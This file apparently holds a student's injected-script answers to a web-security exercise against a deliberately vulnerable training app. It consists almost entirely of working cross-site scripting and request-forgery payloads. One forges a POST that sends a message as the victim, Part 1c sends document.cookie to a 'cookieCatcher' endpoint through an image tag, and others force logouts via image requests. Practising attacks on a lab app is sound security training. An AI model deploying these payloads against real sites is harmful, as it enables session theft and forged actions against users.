// <script>
// $('.container').on('click','.',function(){
//   $.ajax({
//     method: 'GET',
//     url: $(location).attr('href'),
//     success: function(res){
//       $(location).find('.alert').text("HACK HACK HACK")
//     }
//   })
// })
// </script>


<script>
  var localURL = $(location).attr('href');
  $.ajax({
    url: localURL,
    method: 'GET',
    success: function(res){
      console.log("HACK HACK HACK");
    }
  })
</script>

//Part 1b.
<script>
  var localURL = $(location).attr('href');
  $.ajax({
    url: localURL,
    method: 'GET',
    success: function(res){
      $.ajax({
        url: localURL,
        method: "POST",
        data: {
          to: "Kobe",
          body: "TES TEST TEST"
        },
        success: function(){
          console.log("succeeded????????");
        }
      })
    }
  })
</script>

//Part 1c.
<script>
var img = $("<img>");
console.log(document.cookie);
img.attr("src", "http://localhost:3000/cookieCatcher?cookie="+document.cookie);
console.log($(img).prop('src'));
$("body").append(img);
</script>


//Part 3
<script>
var img = $("<img>");
img.attr("src", "http://localhost:3000/csrfLogout");
$("body").append(img);
</script>



<script>
var img = $("<img>");
img.attr("src", "http://steal-this-app-horizons.herokuapp.com/exercise2/logout");
$("body").append(img);
</script>
